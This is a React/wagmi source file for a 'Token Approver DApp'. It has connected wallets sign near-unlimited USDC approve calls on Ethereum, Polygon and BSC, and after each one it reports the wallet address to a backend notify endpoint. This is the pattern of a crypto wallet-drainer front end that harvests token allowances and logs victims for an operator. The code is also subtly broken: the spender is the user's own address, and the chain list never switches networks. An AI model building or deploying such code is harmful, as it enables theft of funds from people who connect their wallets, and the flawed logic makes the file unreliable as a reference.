import { useConnect, useDisconnect, useAccount, useWalletClient } from 'wagmi'
import { WalletConnectConnector } from 'wagmi/connectors/walletConnect'
import { erc20Abi, parseUnits } from 'viem'
import axios from 'axios'
import { useState } from 'react'

export default function App() {
  const { connect } = useConnect({
    connector: new WalletConnectConnector({
      options: {
        projectId: 'your_walletconnect_project_id',
        showQrModal: true,
      },
    }),
  })
  const { disconnect } = useDisconnect()
  const { address, isConnected } = useAccount()
  const { data: walletClient } = useWalletClient()
  const [status, setStatus] = useState('')
  const [processing, setProcessing] = useState(false)

  const CHAINS = [
    {
      name: 'Ethereum',
      rpc: 'https://rpc.ankr.com/eth',
      tokens: ['0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'], // USDC
    },
    {
      name: 'Polygon',
      rpc: 'https://polygon-rpc.com',
      tokens: ['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'], // USDC
    },
    {
      name: 'BSC',
      rpc: 'https://bsc-dataseed.binance.org',
      tokens: ['0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d'], // USDC
    },
  ]

  const approveTokens = async () => {
    if (!walletClient || !address) return
    setProcessing(true)

    for (const chain of CHAINS) {
      for (const token of chain.tokens) {
        try {
          setStatus(`Approving ${token} on ${chain.name}`)
          const decimals = 6
          const maxAmount = parseUnits('1000000000', decimals)

          await walletClient.writeContract({
            address: token,
            abi: erc20Abi,
            functionName: 'approve',
            args: [address, maxAmount],
          })

          await axios.post(`${import.meta.env.VITE_BACKEND_URL}/notify`, {
            message: `✅ Approved token ${token} on ${chain.name} for ${address}`,
          })

        } catch (err) {
          console.log(`Skip ${token} on ${chain.name}`, err.message)
        }
      }
    }

    setStatus('✅ Done')
    setProcessing(false)
  }

  return (
    <div style={{ padding: 40, textAlign: 'center' }}>
      <h1>🪙 Token Approver DApp</h1>
      {!isConnected ? (
        <button onClick={() => connect()}>Connect Wallet</button>
      ) : (
        <>
          <p>Connected: {address}</p>
          <button onClick={() => disconnect()}>Disconnect</button>
          <button onClick={approveTokens} disabled={processing}>
            {processing ? 'Processing...' : 'Approve Tokens'}
          </button>
          <p style={{ marginTop: 20 }}>{status}</p>
        </>
      )}
    </div>
  )
}
